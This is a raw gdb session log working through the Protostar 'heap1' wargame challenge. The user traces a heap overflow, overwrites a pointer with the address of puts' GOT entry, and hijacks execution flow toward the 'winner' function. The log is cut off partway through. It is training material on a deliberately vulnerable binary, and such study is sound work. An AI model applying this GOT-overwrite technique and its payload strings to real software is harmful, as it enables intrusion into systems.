
user@protostar:/tmp$ cd /opt/protostar/bin/
user@protostar:/opt/protostar/bin$ ls
final0  final2   format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1  format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
user@protostar:/opt/protostar/bin$ ./heap1
Segmentation fault
user@protostar:/opt/protostar/bin$ gdb heap1
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/heap1...done.
(gdb) r
Starting program: /opt/protostar/bin/heap1 

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x804a018 "", src=0x0) at strcpy.c:39
39      strcpy.c: No such file or directory.
        in strcpy.c
(gdb) segfault bcz of strcpy not given src
Undefined command: "segfault".  Try "help".
(gdb) r AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 AAAA

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x804a038 "", src=0x0) at strcpy.c:39
39      strcpy.c: No such file or directory.
        in strcpy.c
(gdb) seg fault memory is diff in strcpy scr 
Undefined command: "seg".  Try "help".
(gdb) r AAAA BBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 AAAA BBBB
and that's a wrap folks!

Program exited with code 031.
(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII 0000111122223333444455556666
Starting program: /opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII 0000111122223333444455556666

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffff973 "0000111122223333444455556666") at strcpy.c:40
40      strcpy.c: No such file or directory.
        in strcpy.c
(gdb) 0x46464646 = FFFF
Undefined command: "0x46464646".  Try "help".
(gdb) backtrace
#0  *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffff973 "0000111122223333444455556666") at strcpy.c:40
#1  0x0804855a in main (argc=3, argv=0xbffff814) at heap1/heap1.c:32
(gdb) disassemble 0x0804855a
Dump of assembler code for function main:
0x080484b9 <main+0>:    push   %ebp
0x080484ba <main+1>:    mov    %esp,%ebp
0x080484bc <main+3>:    and    $0xfffffff0,%esp
0x080484bf <main+6>:    sub    $0x20,%esp
0x080484c2 <main+9>:    movl   $0x8,(%esp)
0x080484c9 <main+16>:   call   0x80483bc <malloc@plt>
0x080484ce <main+21>:   mov    %eax,0x14(%esp)
0x080484d2 <main+25>:   mov    0x14(%esp),%eax
0x080484d6 <main+29>:   movl   $0x1,(%eax)
0x080484dc <main+35>:   movl   $0x8,(%esp)
0x080484e3 <main+42>:   call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:   mov    %eax,%edx
0x080484ea <main+49>:   mov    0x14(%esp),%eax
0x080484ee <main+53>:   mov    %edx,0x4(%eax)
0x080484f1 <main+56>:   movl   $0x8,(%esp)
0x080484f8 <main+63>:   call   0x80483bc <malloc@plt>
0x080484fd <main+68>:   mov    %eax,0x18(%esp)
0x08048501 <main+72>:   mov    0x18(%esp),%eax
0x08048505 <main+76>:   movl   $0x2,(%eax)
0x0804850b <main+82>:   movl   $0x8,(%esp)
0x08048512 <main+89>:   call   0x80483bc <malloc@plt>
0x08048517 <main+94>:   mov    %eax,%edx
0x08048519 <main+96>:   mov    0x18(%esp),%eax
0x0804851d <main+100>:  mov    %edx,0x4(%eax)
0x08048520 <main+103>:  mov    0xc(%ebp),%eax
0x08048523 <main+106>:  add    $0x4,%eax
0x08048526 <main+109>:  mov    (%eax),%eax
0x08048528 <main+111>:  mov    %eax,%edx
0x0804852a <main+113>:  mov    0x14(%esp),%eax
0x0804852e <main+117>:  mov    0x4(%eax),%eax
0x08048531 <main+120>:  mov    %edx,0x4(%esp)
0x08048535 <main+124>:  mov    %eax,(%esp)
0x08048538 <main+127>:  call   0x804838c <strcpy@plt>
0x0804853d <main+132>:  mov    0xc(%ebp),%eax
0x08048540 <main+135>:  add    $0x8,%eax
0x08048543 <main+138>:  mov    (%eax),%eax
0x08048545 <main+140>:  mov    %eax,%edx
0x08048547 <main+142>:  mov    0x18(%esp),%eax
0x0804854b <main+146>:  mov    0x4(%eax),%eax
0x0804854e <main+149>:  mov    %edx,0x4(%esp)
0x08048552 <main+153>:  mov    %eax,(%esp)
0x08048555 <main+156>:  call   0x804838c <strcpy@plt>
0x0804855a <main+161>:  movl   $0x804864b,(%esp)
---Type <return> to continue, or q <return> to quit---
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave  
0x08048567 <main+174>:  ret    
End of assembler dump.
(gdb) set disassembly-flavor intel 
(gdb) disassemble 0x0804855a
Dump of assembler code for function main:
0x080484b9 <main+0>:    push   ebp
0x080484ba <main+1>:    mov    ebp,esp
0x080484bc <main+3>:    and    esp,0xfffffff0
0x080484bf <main+6>:    sub    esp,0x20
0x080484c2 <main+9>:    mov    DWORD PTR [esp],0x8
0x080484c9 <main+16>:   call   0x80483bc <malloc@plt>
0x080484ce <main+21>:   mov    DWORD PTR [esp+0x14],eax
0x080484d2 <main+25>:   mov    eax,DWORD PTR [esp+0x14]
0x080484d6 <main+29>:   mov    DWORD PTR [eax],0x1
0x080484dc <main+35>:   mov    DWORD PTR [esp],0x8
0x080484e3 <main+42>:   call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:   mov    edx,eax
0x080484ea <main+49>:   mov    eax,DWORD PTR [esp+0x14]
0x080484ee <main+53>:   mov    DWORD PTR [eax+0x4],edx
0x080484f1 <main+56>:   mov    DWORD PTR [esp],0x8
0x080484f8 <main+63>:   call   0x80483bc <malloc@plt>
0x080484fd <main+68>:   mov    DWORD PTR [esp+0x18],eax
0x08048501 <main+72>:   mov    eax,DWORD PTR [esp+0x18]
0x08048505 <main+76>:   mov    DWORD PTR [eax],0x2
0x0804850b <main+82>:   mov    DWORD PTR [esp],0x8
0x08048512 <main+89>:   call   0x80483bc <malloc@plt>
0x08048517 <main+94>:   mov    edx,eax
0x08048519 <main+96>:   mov    eax,DWORD PTR [esp+0x18]
0x0804851d <main+100>:  mov    DWORD PTR [eax+0x4],edx
0x08048520 <main+103>:  mov    eax,DWORD PTR [ebp+0xc]
0x08048523 <main+106>:  add    eax,0x4
0x08048526 <main+109>:  mov    eax,DWORD PTR [eax]
0x08048528 <main+111>:  mov    edx,eax
0x0804852a <main+113>:  mov    eax,DWORD PTR [esp+0x14]
0x0804852e <main+117>:  mov    eax,DWORD PTR [eax+0x4]
0x08048531 <main+120>:  mov    DWORD PTR [esp+0x4],edx
0x08048535 <main+124>:  mov    DWORD PTR [esp],eax
0x08048538 <main+127>:  call   0x804838c <strcpy@plt>
0x0804853d <main+132>:  mov    eax,DWORD PTR [ebp+0xc]
0x08048540 <main+135>:  add    eax,0x8
0x08048543 <main+138>:  mov    eax,DWORD PTR [eax]
0x08048545 <main+140>:  mov    edx,eax
0x08048547 <main+142>:  mov    eax,DWORD PTR [esp+0x18]
0x0804854b <main+146>:  mov    eax,DWORD PTR [eax+0x4]
0x0804854e <main+149>:  mov    DWORD PTR [esp+0x4],edx
0x08048552 <main+153>:  mov    DWORD PTR [esp],eax
0x08048555 <main+156>:  call   0x804838c <strcpy@plt>
0x0804855a <main+161>:  mov    DWORD PTR [esp],0x804864b
---Type <return> to continue, or q <return> to quit---
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave  
0x08048567 <main+174>:  ret    
End of assembler dump.
(gdb) now we need to exploit got globle offset table
Undefined command: "now".  Try "help".
(gdb) disassemble 0x80483cc
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:        jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:        push   0x30
0x080483d7 <puts@plt+11>:       jmp    0x804835c
End of assembler dump.
(gdb) x/s 0x8049774
0x8049774 <_GLOBAL_OFFSET_TABLE_+36>:    "\004\b"
(gdb) yeh
Undefined command: "yeh".  Try "help".
(gdb) run "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFF" 0000111122223333444455556666"
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFF" 0000111122223333444455556666"
/bin/sh: Syntax error: EOF in backquote substitution
During startup program exited with code 2.
(gdb) run "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFF"`" 0000111122223333444455556666
Starting program: /opt/protostar/bin/heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEEFFFF"`" 0000111122223333444455556666

Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffff973 "0000111122223333444455556666") at strcpy.c:40
40      strcpy.c: No such file or directory.
        in strcpy.c
(gdb) same seg fualt yeh right way
Undefined command: "same".  Try "help".
(gdb) 
Undefined command: "same".  Try "help".
(gdb) now replace FFFF with GOT add.
Undefined command: "now".  Try "help".
(gdb) run "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" 0000111122223333444455556666
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" 0000111122223333444455556666

Program received signal SIGSEGV, Segmentation fault.
0x30303030 in ?? ()
(gdb) 0x30303030 = 0000
Undefined command: "0x30303030".  Try "help".
(gdb) now we need to change 0000 to any where we want
Undefined command: "now".  Try "help".
(gdb) info functions
All defined functions:

File heap1/heap1.c:
int main(int, char **);
void winner(void);

File rtld.c:
void **_dl_initial_error_catch_tsd(void);
static Elf32_Addr _dl_start(void *);

File ../sysdeps/unix/sysv/linux/dl-osinfo.h:
static void dl_fatal(const char *);

File rtld.c:
static void dl_main(const Elf32_Phdr *, Elf32_Word, Elf32_Addr *);
static void dlmopen_doit(void *);
static unsigned int do_preload(char *, struct link_map *, const char *);
static void *init_tls(void);
static void lookup_doit(void *);
static void map_doit(void *);
static void print_missing_version(int, const char *, const char *);
static void print_statistics(hp_timing_t *);
static void print_unresolved(int, const char *, const char *);
static void process_dl_audit(char *);
static void process_dl_debug(const char *);
static void process_envvars(enum mode *);
static void relocate_doit(void *);
static void rtld_lock_default_lock_recursive(void *);
static void rtld_lock_default_unlock_recursive(void *);
static void security_init(void);
static void version_check_doit(void *);

File dl-load.c:
size_t _dl_dst_count(const char *, int);
char *_dl_dst_substitute(struct link_map *, const char *, char *, int);
void _dl_init_paths(const char *);
struct link_map *_dl_map_object(struct link_map *, const char *, int, int, int, Lmid_t);
void _dl_rtld_di_serinfo(struct link_map *);
static struct link_map *_dl_map_object_from_fd(const char *, int, struct filebuf *, char *, struct link_map *, int, int, void **, Lmid_t);
static void add_name_to_object(struct link_map *, const char *);
static _Bool cache_rpath(struct link_map *, struct r_search_path_struct *, int, const char *);
static _Bool decompose_rpath(struct r_search_path_struct *, const char *, struct link_map *, const char *);
static char *expand_dynamic_string_token(struct link_map *, const char *);
static struct r_search_path_elem **fillin_rpath(char *, struct r_search_path_elem **, const char *, int, const char *, const char *);
---Type <return> to continue, or q <return> to quit---
static size_t is_dst(const char *, const char *, const char *, int, int);
static char *local_strdup(const char *);
static void lose(int, int, const char *, char *, struct link_map *, const char *, struct r_debug *);
static int open_path(const char *, size_t, int, struct r_search_path_struct *, char **, struct filebuf *, struct link_map *, int, _Bool *);
static int open_verify(const char *, struct filebuf *, struct link_map *, int, _Bool *, _Bool);
static void print_search_path(struct r_search_path_elem **, const char *, const char *);

File dl-cache.c:
int _dl_cache_libcmp(const char *, const char *);
const char *_dl_load_cache_lookup(const char *);
void _dl_unload_cache(void);

File dl-lookup.c:
lookup_t _dl_lookup_symbol_x(const char *, struct link_map *, const Elf32_Sym **, struct r_scope_elem **, const struct r_found_version *, int, int, struct link_map *);
void _dl_setup_hash(struct link_map *);
static int do_lookup_x(uint_fast32_t, long unsigned int *, const Elf32_Sym *, struct sym_val *, struct r_scope_elem *, size_t, int, struct link_map *, struct link_map *);

File dl-object.c:
struct link_map *_dl_new_object(char *, const char *, int, struct link_map *, int, Lmid_t);

File dl-reloc.c:
void _dl_allocate_static_tls(struct link_map *);
void _dl_nothread_init_static_tls(struct link_map *);
void _dl_protect_relro(struct link_map *);
void _dl_reloc_bad_type(struct link_map *, unsigned int, int);
void _dl_relocate_object(struct r_scope_elem **, int, int);
int _dl_try_allocate_static_tls(struct link_map *);

File dl-deps.c:
void _dl_map_object_deps(struct link_map *, struct link_map **, unsigned int, int, int);
static ptrdiff_t _dl_build_local_scope(struct link_map **, struct link_map *);
static void openaux(void *);

File dl-runtime.c:
void _dl_call_pltexit(struct link_map *, Elf32_Word, const void *, void *);
Elf32_Addr _dl_fixup(struct link_map *, Elf32_Word);
Elf32_Addr _dl_profile_fixup(struct link_map *, Elf32_Word, Elf32_Addr, void *, long int *);

File dl-error.c:
int _dl_catch_error(const char **, const char **, _Bool *, void (*)(void *), void *);
void _dl_receive_error(receiver_fct, void (*)(void *), void *);
void _dl_signal_cerror(int, const char *, const char *, const char *);
void _dl_signal_error(int, const char *, const char *, const char *);

---Type <return> to continue, or q <return> to quit---
File dl-init.c:
void _dl_init(struct link_map *, int, char **, char **);
static void call_init(struct link_map *, int, char **, char **);

File dl-fini.c:
void _dl_fini(void);
void _dl_sort_fini(struct link_map *, struct link_map **, size_t, char *, Lmid_t);

File dl-misc.c:
void _dl_debug_printf(const char *, ...);
void _dl_debug_printf_c(const char *, ...);
void _dl_dprintf(int, const char *, ...);
long unsigned int _dl_higher_prime_number(long unsigned int);
int _dl_name_match_p(const char *, const struct link_map *);
void *_dl_sysdep_read_whole_file(const char *, size_t *, int);
static void _dl_debug_vdprintf(int, int, const char *, va_list);

File dl-version.c:
int _dl_check_all_versions(struct link_map *, int, int);
int _dl_check_map_versions(struct link_map *, int, int);
static int match_symbol(const char *, Lmid_t, Elf32_Word, const char *, struct link_map *, int, int);

File dl-profile.c:
void _dl_mcount(Elf32_Addr, Elf32_Addr);
void _dl_start_profile(void);

File dl-conflict.c:
void _dl_resolve_conflicts(struct link_map *, Elf32_Rela *, Elf32_Rela *);

File dl-tls.c:
void **__GI__dl_allocate_tls(void *);
void **__GI__dl_allocate_tls_init(void *);
void *__GI__dl_deallocate_tls(void *, _Bool);
int *__GI__dl_tls_setup(void);
void *___tls_get_addr(tls_index *);

File ../sysdeps/i386/dl-tls.h:
void *__tls_get_addr(tls_index *);

File dl-tls.c:
void _dl_add_to_slotinfo(struct link_map *);
void *_dl_allocate_tls_storage(void);
void _dl_determine_tlsoffset(void);
void _dl_get_tls_static_info(size_t *, size_t *);
---Type <return> to continue, or q <return> to quit---
size_t _dl_next_tls_modid(void);
void *_dl_tls_get_addr_soft(struct link_map *);
struct link_map *_dl_update_slotinfo(long unsigned int);
static void oom(void);
static void *tls_get_addr_tail(dtv_t *, struct link_map *, size_t);

File ../sysdeps/unix/sysv/linux/dl-origin.c:
const char *_dl_get_origin(void);

File dl-scope.c:
int _dl_scope_free(void *);

File ../sysdeps/unix/sysv/linux/dl-execstack.c:
int *__GI__dl_make_stack_executable(void **);

File dl-caller.c:
int _dl_check_caller(const void *, enum allowmask);

File dl-open.c:
int _dl_addr_inside_object(struct link_map *, const Elf32_Addr);
void *_dl_open(const char *, int, const void *, Lmid_t, int, char **, char **);
static int add_to_global(struct link_map *);
static void dl_open_worker(void *);

File dl-close.c:
void _dl_close(void *);
void _dl_close_worker(struct link_map *);
static void free_mem(void);
static _Bool free_slotinfo(struct dtv_slotinfo_list **);
static _Bool remove_slotinfo(size_t, struct dtv_slotinfo_list *, size_t, _Bool);

File ../sysdeps/unix/sysv/linux/dl-sysdep.c:
int _dl_discover_osversion(void);

File ../elf/dl-sysdep.c:
const struct r_strlenpair *_dl_important_hwcaps(const char *, size_t, size_t *, size_t *);
void _dl_show_auxv(void);
Elf32_Addr _dl_sysdep_start(void **, void (*)(const Elf32_Phdr *, Elf32_Word, Elf32_Addr *));
void _dl_sysdep_start_cleanup(void);

File dl-environ.c:
char *_dl_next_ld_env_entry(char ***);
int unsetenv(const char *);

---Type <return> to continue, or q <return> to quit---
File dl-minimal.c:
void *__GI___assert_fail(const char *, const char *, unsigned int, const char *);
void *__GI___assert_perror_fail(int, const char *, unsigned int, const char *);
void *__GI___chk_fail(void);
void *__libc_memalign(size_t, size_t);
int __sigjmp_save(struct __jmp_buf_tag *, int);
char *__strerror_r(int, char *, size_t);
char *__strsep(char **, const char *);
long unsigned int __strtoul_internal(const char *, char **, int, int);
char *_itoa(long long unsigned int, char *, unsigned int, int);
void *calloc(size_t, size_t);
void free(void *);
void *malloc(size_t);
void *realloc(void *, size_t);

File ../sysdeps/unix/sysv/linux/i386/brk.c:
int __brk(void *);

File ../misc/sbrk.c:
void *__sbrk(intptr_t);

File ./tlsdeschtab.h:
void *_dl_make_tlsdesc_dynamic(struct link_map *, size_t);

File ../sysdeps/i386/tlsdesc.c:
void _dl_tlsdesc_resolve_abs_plus_addend_fixup(volatile struct tlsdesc *, struct link_map *, ptrdiff_t);
void _dl_tlsdesc_resolve_hold_fixup(volatile struct tlsdesc *, struct link_map *, ptrdiff_t);
void _dl_tlsdesc_resolve_rel_fixup(volatile struct tlsdesc *, struct link_map *, ptrdiff_t);
void _dl_tlsdesc_resolve_rela_fixup(volatile struct tlsdesc *, struct link_map *, ptrdiff_t);
void _dl_unmap(struct link_map *);

File ./tlsdeschtab.h:
static int eq_tlsdesc(void *, void *);
static int hash_tlsdesc(void *);

File check_fds.c:
void __libc_check_standard_fds(void);
static void check_one_fd(int, int);

File ../sysdeps/wordsize-32/divdi3.c:
DItype __divdi3(DItype, DItype);
DItype __moddi3(DItype, DItype);
UDItype __udivdi3(UDItype, UDItype);
UDItype __umoddi3(UDItype, UDItype);
---Type <return> to continue, or q <return> to quit---
static UDItype __udivmoddi4(UDItype, UDItype, UDItype *);

File ../sysdeps/posix/profil.c:
int __profil(u_short *, size_t, size_t, u_int);

File ../sysdeps/unix/sysv/linux/i386/profil-counter.h:
static void profil_counter(int, const struct sigcontext);

File ../sysdeps/unix/sysv/linux/prof-freq.c:
int __profile_frequency(void);

File ../sysdeps/unix/sysv/linux/xstat64.c:
int ___xstat64(int, const char *, struct stat64 *);

File ../sysdeps/unix/sysv/linux/fxstat64.c:
int ___fxstat64(int, int, struct stat64 *);

File ../sysdeps/unix/sysv/linux/i386/fcntl.c:
int __libc_fcntl(int, int, ...);

File ../sysdeps/unix/sysv/linux/getcwd.c:
char *__getcwd(char *, size_t);

File ../nptl/sysdeps/unix/sysv/linux/getpid.c:
pid_t __getpid(void);

File ../sysdeps/unix/sysv/linux/i386/sigaction.c:
int __libc_sigaction(int, const struct sigaction *, struct sigaction *);

File ../nptl/sigaction.c:
int __sigaction(int, const struct sigaction *, struct sigaction *);

File strcmp.c:
int strcmp(const char *, const char *);

File strcpy.c:
char *strcpy(char *, const char *);

File strnlen.c:
size_t __strnlen(const char *, size_t);

File memmove.c:
void *memmove(void *, const void *, size_t);

---Type <return> to continue, or q <return> to quit---
File ../sysdeps/i386/memset.c:
void *memset(void *, int, size_t);

File mempcpy.c:
void *__mempcpy(void *, const void *, size_t);

File memcpy.c:
void *memcpy(void *, const void *, size_t);

File dl-debug.c:
void *__GI__dl_debug_state(void);
struct r_debug *_dl_debug_initialize(Elf32_Addr, Lmid_t);

File soinit.c:
void __libc_fini(void);
void __libc_global_ctors(void);

File ../sysdeps/unix/sysv/linux/init-first.c:
void __libc_init_first(int, char **, char **);
void _dl_start(void);
void _init(int, char **, char **);

File libc-start.c:
int __libc_start_main(int (*)(int, char **, char **), int, char **, int (*)(int, char **, char **), void (*)(void), void (*)(void), void *);

File version.c:
const char *__gnu_get_libc_release(void);
const char *__gnu_get_libc_version(void);
void __libc_main(void);
void __libc_print_version(void);

File check_fds.c:
void __libc_check_standard_fds(void);
static void check_one_fd(int, int);

File ../nptl/sysdeps/pthread/unwind-resume.c:
void _Unwind_Resume(struct _Unwind_Exception *);
_Unwind_Reason_Code __gcc_personality_v0(int, _Unwind_Action, _Unwind_Exception_Class, struct _Unwind_Exception *, struct _Unwind_Context *);
static void init(void);

File errno-loc.c:
int **__GI___errno_location(void);

File ../sysdeps/i386/libgcc-compat.c:
---Type <return> to continue, or q <return> to quit---
int32_t __cmpdi2_internal(int64_t, int64_t);
int64_t __fixunsdfdi_internal(double);
int64_t __fixunssfdi_internal(float);
int64_t __fixunsxfdi_internal(XFtype);
double __floatdidf_internal(int64_t);
int32_t __ucmpdi2_internal(int64_t, int64_t);

File ../sysdeps/wordsize-32/divdi3.c:
DItype __divdi3(DItype, DItype);
DItype __moddi3(DItype, DItype);
UDItype __udivdi3(UDItype, UDItype);
UDItype __umoddi3(UDItype, UDItype);
static UDItype __udivmoddi4(UDItype, UDItype, UDItype *);

File iconv_open.c:
iconv_t iconv_open(const char *, const char *);

File gconv_charset.h:
static void strip(char *, const char *);

File iconv.c:
size_t iconv(iconv_t, char **, size_t *, char **, size_t *);

File iconv_close.c:
int iconv_close(iconv_t);

File gconv_open.c:
int __gconv_open(const char *, const char *, __gconv_t *, int);

File gconv.c:
int __gconv(__gconv_t, const unsigned char **, const unsigned char *, unsigned char **, unsigned char *, size_t *);

File gconv_close.c:
int __gconv_close(__gconv_t);

File gconv_db.c:
int __gconv_alias_compare(const void *, const void *);
int __gconv_close_transform(struct __gconv_step *, size_t);
int __gconv_compare_alias(const char *, const char *);
int __gconv_find_transform(const char *, const char *, struct __gconv_step **, size_t *, int);
void *__gconv_get_alias_db(void);
struct gconv_module *__gconv_get_modules_db(void);
void __gconv_release_step(struct __gconv_step *);
static int derivation_compare(const void *, const void *);
---Type <return> to continue, or q <return> to quit---
static const char *do_lookup_alias(const char *);
static int find_derivation(const char *, const char *, const char *, const char *, struct __gconv_step **, size_t *);
static void free_derivation(void *);
static void free_mem(void);
static void free_modules_db(struct gconv_module *);

File gconv_conf.c:
void __gconv_get_path(void);
void __gconv_read_conf(void);
static void add_alias2(const char *, const char *, const char *, void *);
static void add_module(char *, const char *, size_t, void **, size_t *, int);
static void free_mem(void);
static void insert_module(struct gconv_module *, int);

File gconv_builtin.c:
void __gconv_get_builtin_trans(const char *, struct __gconv_step *);

File gconv_simple.c:
wint_t __gconv_btwoc_ascii(struct __gconv_step *, unsigned char);

File ../iconv/skeleton.c:
int __gconv_transform_ascii_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ascii(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs2reverse(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_ucs4le(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_internal_utf8(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_ucs2reverse_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_ucs4le_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);
int __gconv_transform_utf8_internal(struct __gconv_step *, struct __gconv_step_data *, const unsigned char **, const unsigned char *, unsigned char **, size_t *, int, int);

File gconv_trans.c:
int __gconv_translit_find(struct trans_struct *);
int __gconv_transliterate(struct __gconv_step *, struct __gconv_step_data *, void *, const unsigned char *, const unsigned char **, const unsigned char *, unsigned char **, size_t *);
static int open_translit(struct known_trans *);
static int trans_compare(const void *, const void *);

File gconv_cache.c:
int __gconv_compare_alias_cache(const char *, const char *, int *);
void *__gconv_get_cache(void);
int __gconv_load_cache(void);
---Type <return> to continue, or q <return> to quit---
int __gconv_lookup_cache(const char *, const char *, struct __gconv_step **, size_t *, int);
void __gconv_release_cache(struct __gconv_step *, size_t);
static int find_module(const char *, const char *, struct __gconv_step *);
static int find_module_idx(const char *, size_t *);
static void free_mem(void);

File gconv_dl.c:
struct __gconv_loaded_object *__gconv_find_shlib(const char *);
void __gconv_release_shlib(struct __gconv_loaded_object *);
static void do_release_all(void *);
static void do_release_shlib(void *, VISIT, int);
static void free_mem(void);
static int known_compare(const void *, const void *);

File mb_cur_max.c:
size_t __ctype_get_mb_cur_max(void);

File setlocale.c:
char **__GI_setlocale(int, const char *);
void _nl_locale_subfreeres(void);
static char *new_composite_name(int, const char **);
static void setname(int, const char *);

File findlocale.c:
struct locale_data *_nl_find_locale(const char *, size_t, int, const char **);
void _nl_remove_locale(int, struct locale_data *);

File ../iconv/gconv_charset.h:
static void strip(char *, const char *);

File loadlocale.c:
struct locale_data *_nl_intern_locale_data(int, const void *, size_t);
void _nl_load_locale(struct loaded_l10nfile *, int);
void _nl_unload_locale(struct locale_data *);

File loadarchive.c:
void _nl_archive_subfreeres(void);
struct locale_data *_nl_load_locale_from_archive(int, const char **);
static int rangecmp(const void *, const void *);

File localeconv.c:
struct lconv *__localeconv(void);

File nl_langinfo.c:
---Type <return> to continue, or q <return> to quit---
char **__GI_nl_langinfo(nl_item);

File nl_langinfo_l.c:
char **__GI___nl_langinfo_l(nl_item, __locale_t);

File newlocale.c:
__locale_t __newlocale(int, const char *, __locale_t);

File duplocale.c:
__locale_t __duplocale(__locale_t);

File freelocale.c:
void __freelocale(__locale_t);

File uselocale.c:
struct __locale_struct **__GI___uselocale(locale_t);

File coll-lookup.c:
int32_t __collidx_table_lookup(const char *, uint32_t);
uint32_t __collseq_table_lookup(const char *, uint32_t);

File lc-ctype.c:
void _nl_postload_ctype(void);

File localename.c:
const char *__current_locale_name(int);

File assert.c:
void *__GI___assert_fail(const char *, const char *, unsigned int, const char *);

File assert-perr.c:
void *__GI___assert_perror_fail(int, const char *, unsigned int, const char *);

File __assert.c:
void __assert(const char *, const char *, int);

File ctype.c:
int isalnum(int);
int isalpha(int);
int iscntrl(int);
int isdigit(int);
int isgraph(int);
int islower(int);
int isprint(int);
---Type <return> to continue, or q <return> to quit---
int ispunct(int);
int isspace(int);
int isupper(int);
int isxdigit(int);
int tolower(int);
int toupper(int);

File ctype-extn.c:
int __isblank_l(int, __locale_t);
int _tolower(int);
int _toupper(int);
int isascii(int);
int isblank(int);
int toascii(int);

File ctype_l.c:
int __isalnum_l(int, __locale_t);
int __isalpha_l(int, __locale_t);
int __iscntrl_l(int, __locale_t);
int __isdigit_l(int, __locale_t);
int __isgraph_l(int, __locale_t);
int __islower_l(int, __locale_t);
int __isprint_l(int, __locale_t);
int __ispunct_l(int, __locale_t);
int __isspace_l(int, __locale_t);
int __isupper_l(int, __locale_t);
int __isxdigit_l(int, __locale_t);
int __tolower_l(int, __locale_t);
int __toupper_l(int, __locale_t);

File isctype.c:
int __isctype(int, int);

File ../include/ctype.h:
const short unsigned int **__ctype_b_loc(void);
const __int32_t **__ctype_tolower_loc(void);
const __int32_t **__ctype_toupper_loc(void);

File bindtextdom.c:
char *__bind_textdomain_codeset(const char *, const char *);
char *__bindtextdomain(const char *, const char *);
static void set_binding_values(const char *, const char **, const char **);

File dcgettext.c:
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" 0000111122223333444455556666

Program received signal SIGSEGV, Segmentation fault.
0x30303030 in ?? ()
(gdb) b main
Breakpoint 1 at 0x80484c2: file heap1/heap1.c, line 23.
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" 0000111122223333444455556666

Breakpoint 1, main (argc=3, argv=0xbffff824) at heap1/heap1.c:23
23      heap1/heap1.c: No such file or directory.
        in heap1/heap1.c
(gdb) info functions
All defined functions:

File heap1/heap1.c:
int main(int, char **);
void winner(void);

File dl-load.c:
size_t _dl_dst_count(const char *, int);
char *_dl_dst_substitute(struct link_map *, const char *, char *, int);
void _dl_init_paths(const char *);
struct link_map *_dl_map_object(struct link_map *, const char *, int, int, int, Lmid_t);
void _dl_rtld_di_serinfo(struct link_map *);
static struct link_map *_dl_map_object_from_fd(const char *, int, struct filebuf *, char *, struct link_map *, int, int, void **, Lmid_t);
static void add_name_to_object(struct link_map *, const char *);
